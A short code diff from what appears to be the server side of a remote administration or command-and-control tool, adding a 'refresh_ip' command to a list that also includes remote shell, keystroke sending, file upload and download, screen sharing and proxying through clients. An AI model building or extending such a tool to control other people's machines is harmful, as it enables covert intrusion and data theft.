@@ -34,7 +34,7 @@ def client_command_mode(active_client, client_sockets, server_running, print_ban
         "list_processes", "search_process", "terminate_process", "send_keys", 
         "system_logs", "installed_software", "launch_app", "shell", 
         "start_screen_share", "stop_screen_share", "upload_file", "download_file",
-        "start_proxy", "stop_proxy", "proxy_status"
+        "start_proxy", "stop_proxy", "proxy_status", "refresh_ip"
     ]
     
     # Function to check if a command is valid
